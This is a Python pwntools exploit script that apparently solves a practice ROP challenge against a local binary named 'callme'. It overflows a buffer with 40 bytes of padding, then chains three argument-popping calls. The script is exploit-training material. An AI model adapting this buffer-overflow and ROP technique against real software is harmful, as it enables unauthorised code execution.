import sys
from pwn import *

elf = ELF('callme')
io = process(elf.path)


pop_args_loc = 0x40093c
arg_1 = 0xdeadbeefdeadbeef
callme_one_loc = 0x0000000000400720 

#pop_args_loc
arg_2 = 0xcafebabecafebabe
callme_two_loc = 0x0000000000400740 

#pop_args_loc
arg_3 = 0xd00df00dd00df00d
callme_three_loc = 0x00000000004006f0 

rop_chain = p64(pop_args_loc)
rop_chain += p64(arg_1)
rop_chain += p64(arg_2)
rop_chain += p64(arg_3)
rop_chain += p64(callme_one_loc)

rop_chain += p64(pop_args_loc)
rop_chain += p64(arg_1)
rop_chain += p64(arg_2)
rop_chain += p64(arg_3)
rop_chain += p64(callme_two_loc)

rop_chain += p64(pop_args_loc)
rop_chain += p64(arg_1)
rop_chain += p64(arg_2)
rop_chain += p64(arg_3)
rop_chain += p64(callme_three_loc)

exploit = b'A' * 40 + rop_chain

with open('./payload', 'wb') as payload_fh:
    payload_fh.write(exploit)

io.sendline(exploit)
io.interactive()
